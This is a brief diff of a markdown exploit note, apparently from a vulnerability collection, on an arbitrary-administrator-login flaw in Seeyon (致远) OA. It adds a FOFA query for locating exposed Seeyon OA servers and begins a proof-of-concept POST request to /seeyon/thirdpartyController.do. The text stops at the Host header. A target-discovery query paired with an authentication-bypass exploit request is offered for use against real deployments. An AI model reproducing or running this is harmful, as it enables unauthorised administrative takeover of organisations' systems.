@@ -1,4 +1,11 @@
 ## 致远OA任意管理员登录
+
+## fofa
+```
+app="致远互联-OA"
+```
+
+## poc
 ```
 POST /seeyon/thirdpartyController.do HTTP/1.1
 Host: 
